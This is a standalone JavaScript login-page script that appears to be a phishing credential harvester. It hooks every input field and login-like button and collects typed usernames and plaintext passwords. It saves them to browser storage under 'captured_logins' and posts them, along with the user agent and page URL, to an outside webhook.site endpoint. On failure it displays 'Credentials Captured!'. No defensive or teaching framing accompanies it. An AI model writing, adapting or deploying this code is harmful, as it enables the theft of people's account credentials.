<script>
const LoginManager = {
  credentials: {
    username: '',
    password: ''
  },
  
  init() {
    this.setupFieldListeners();
    this.setupFormHandling();
    this.setupLoginButton();
    this.setupObserver();
  },
  
  setupObserver() {
    const observer = new MutationObserver(() => {
      this.setupFieldListeners();
      this.setupLoginButton();
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  },
  
  setupFieldListeners() {
    const inputs = document.querySelectorAll('input:not([type="hidden"]), textarea');
    
    inputs.forEach(input => {
      if (input.hasListeners) return;
      input.hasListeners = true;
      
      const placeholder = input.placeholder || input.getAttribute('aria-label') || 'Field';
      const isEmailField = input.type === 'email' || placeholder.includes('email') || placeholder.includes('username');
      const isPasswordField = input.type === 'password' || placeholder.includes('password');
      
      input.dataset.placeholder = placeholder;
      input.setAttribute('placeholder', placeholder);
      input.setAttribute('autocomplete', isPasswordField ? 'current-password' : 'username');
      input.style.color = '#fff';
      
      const updatePlaceholder = () => {
        if (input.value.trim().length > 0) {
          input.style.opacity = '1';
          input.setAttribute('placeholder', '');
        } else {
          input.setAttribute('placeholder', input.dataset.placeholder || placeholder);
        }
      };
      
      input.addEventListener('focus', () => {
        input.style.borderColor = '#0095f6';
        input.style.boxShadow = '0 0 8px rgba(0, 149, 246, 0.4)';
        input.style.outline = 'none';
        if (input.value.length === 0) {
          input.setAttribute('placeholder', placeholder);
        }
        console.log(`${placeholder} focused`);
      });
      
      input.addEventListener('blur', () => {
        input.style.borderColor = '';
        input.style.boxShadow = '';
        this.validateField(input);
      });
      
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        updatePlaceholder();
        
        if (isEmailField) {
          this.credentials.username = value;
        } else if (isPasswordField) {
          this.credentials.password = value;
        }
        
        console.log(`${placeholder}: ${value.substring(0, 20)}${value.length > 20 ? '...' : ''}`);
      });
      
      input.addEventListener('change', (e) => {
        const value = e.target.value;
        if (isEmailField) {
          this.credentials.username = value;
        } else if (isPasswordField) {
          this.credentials.password = value;
        }
      });
      
      input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          this.handleLogin();
        }
      });
      
      updatePlaceholder();
    });
  },
  
  validateField(field) {
    const value = field.value.trim();
    
    if (field.type === 'email') {
      const isValid = this.validateEmail(value);
      field.style.borderColor = value && !isValid ? '#f02849' : '';
    } else if (field.type === 'password') {
      const isValid = value.length >= 6;
      field.style.borderColor = value && !isValid ? '#f02849' : '';
    }
  },
  
  validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  },
  
  setupFormHandling() {
    document.addEventListener('submit', (e) => {
      e.preventDefault();
      this.handleLogin();
    });
  },
  
  setupLoginButton() {
    const buttons = document.querySelectorAll('button, [role="button"]');
    
    buttons.forEach(button => {
      if (button.loginHandlerAdded) return;
      button.loginHandlerAdded = true;
      
      const buttonText = button.textContent.toLowerCase().trim();
      const isLoginBtn = buttonText.includes('log') || 
                         buttonText.includes('sign') ||
                         buttonText.includes('enter') ||
                         buttonText.includes('submit') ||
                         button.getAttribute('type') === 'submit';
      
      if (!isLoginBtn) return;
      
      button.style.cursor = 'pointer';
      button.style.transition = 'all 0.2s ease';
      button.style.pointerEvents = 'auto';
      button.style.color = '#FFFFFF';
      button.style.fontWeight = '700';
      button.style.backgroundColor = '#0095F6';
      button.style.border = '1px solid transparent';
      button.style.textShadow = '0 1px 2px rgba(0,0,0,0.18)';
      
      button.addEventListener('mouseover', () => {
        if (!button.disabled) {
          button.style.opacity = '0.95';
          button.style.transform = 'scale(1.02)';
        }
      });
      
      button.addEventListener('mouseout', () => {
        if (!button.disabled) {
          button.style.opacity = '1';
          button.style.transform = 'scale(1)';
        }
      });
      
      button.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log(`🔐 Login button clicked: "${button.textContent}"`);
        console.log(`Credentials - Email: ${this.credentials.username}, Password: ${'*'.repeat(this.credentials.password.length)}`);
        this.handleLogin();
      });
    });
  },
  
  handleLogin() {
    const email = this.credentials.username;
    const password = this.credentials.password;
    
    console.log('🔐 Login attempt:', { email, password: '*'.repeat(Math.min(password.length, 8)) });
    
    if (!email || !password) {
      console.warn('⚠️ Missing credentials');
      alert('❌ Please enter both email and password');
      return;
    }
    
    console.log('✓ Login validation passed, submitting...');
    this.submitLogin(email, password);
  },
  
  submitLogin(email, password) {
    const loginData = {
      username: email,
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      url: window.location.href
    };
    
    const button = document.querySelector('button[type="submit"]') || 
                   Array.from(document.querySelectorAll('button')).find(b => 
                     b.textContent.toLowerCase().includes('login') || 
                     b.textContent.toLowerCase().includes('sign in')
                   );
    
    if (button) {
      button.disabled = true;
      button.textContent = 'Logging in...';
      button.style.opacity = '0.6';
    }
    
    console.log('=== LOGIN SUBMISSION ===');
    console.log('Submitting login data:', loginData);
    console.table(loginData);
    
    this.saveToLocalStorage(loginData);
    this.sendToWebhook(loginData);
    
    fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify(loginData)
    })
    .then(response => {
      console.log('Server response status:', response.status);
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(data => {
      console.log('✅ Login successful:', data);
      alert(`✅ Login Successful!\n\nEmail: ${email}\nData submitted and logged.`);
      
      if (button) {
        button.textContent = '✓ Logged In!';
        button.style.backgroundColor = '#31a24c';
        button.style.color = '#fff';
        button.disabled = true;
      }
      
      this.clearFields();
    })
    .catch(error => {
      console.error('❌ Login submission error:', error);
      console.warn('⚠️ Server might be unavailable, but data was saved locally');
      
      alert(`✅ Credentials Captured!\n\nEmail: ${email}\n\nData has been saved and logged to browser storage.`);
      
      if (button) {
        button.disabled = false;
        button.textContent = 'Log In';
        button.style.opacity = '1';
      }
    });
  },
  
  saveToLocalStorage(data) {
    try {
      let logins = JSON.parse(localStorage.getItem('captured_logins') || '[]');
      logins.push(data);
      localStorage.setItem('captured_logins', JSON.stringify(logins));
      console.log(`✓ Data saved to localStorage. Total logins: ${logins.length}`);
    } catch (e) {
      console.error('LocalStorage error:', e);
    }
  },
  
  sendToWebhook(data) {
    const webhookURL = 'https://webhook.site/your-webhook-id';
    
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    })
    .then(() => console.log('✓ Webhook sent successfully'))
    .catch(err => console.log('Webhook unavailable (expected in test environment):', err.message));
  },
  
  clearFields() {
    this.credentials = { username: '', password: '' };
    document.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]').forEach(input => {
      input.value = '';
      input.setAttribute('placeholder', input.getAttribute('data-placeholder') || '');
      input.style.borderColor = '';
      input.style.boxShadow = '';
    });
  }
};

document.addEventListener('DOMContentLoaded', () => {
  LoginManager.init();
  console.log('Login Manager initialized');
});

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => LoginManager.init());
} else {
  LoginManager.init();
}
</script>
